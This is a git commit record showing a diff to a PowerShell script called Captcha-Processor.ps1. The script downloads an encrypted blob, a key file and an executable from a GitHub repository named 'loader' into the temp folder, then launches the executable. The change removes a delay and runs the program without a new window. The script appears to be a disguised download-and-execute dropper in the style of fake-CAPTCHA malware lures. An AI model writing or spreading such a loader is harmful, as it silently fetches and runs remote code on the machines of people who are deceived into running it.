43ab4ad67f0e4a58b57bedbbac2a7ffc48c1ee27
waveget <nathanppwalker@gmail.com>
2024-10-13 17:18:53 +0100

    Update Captcha-Processor.ps1

--- Captcha-Processor.ps1
+++ Captcha-Processor.ps1
@@ -2,5 +2,4 @@ $tempPath = "$env:TEMP"
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/cipher.bin" -OutFile "$tempPath\cipher.bin"
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/key.bin" -OutFile "$tempPath\key.bin"
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/waveget/loader/refs/heads/main/CaptchaProcessor ReCaptcha.exe" -OutFile "$tempPath\CaptchaProcessor ReCaptcha.exe"
-Start-Sleep -Seconds 5
-Start-Process -FilePath "$tempPath\CaptchaProcessor ReCaptcha.exe"
+Start-Process -FilePath "$tempPath\CaptchaProcessor ReCaptcha.exe" -NoNewWindow
